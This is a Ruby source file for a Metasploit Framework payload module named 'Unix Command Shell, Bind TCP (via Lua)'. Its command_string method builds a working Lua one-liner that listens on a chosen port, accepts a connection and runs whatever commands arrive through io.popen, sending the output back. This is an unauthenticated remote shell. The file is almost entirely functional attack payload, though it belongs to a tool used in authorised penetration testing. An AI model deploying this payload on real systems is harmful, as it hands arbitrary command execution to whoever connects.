##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 218

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (via Lua)',
        'Description' => 'Listen for a connection and spawn a command shell via Lua',
        'Author' => [
          'xistence <xistence[at]0x90.nl>',
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'lua',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('LuaPath', [true, 'The path to the Lua executable', 'lua'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['LuaPath']} -e \"local s=require('socket');local s=assert(s.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
  end
end
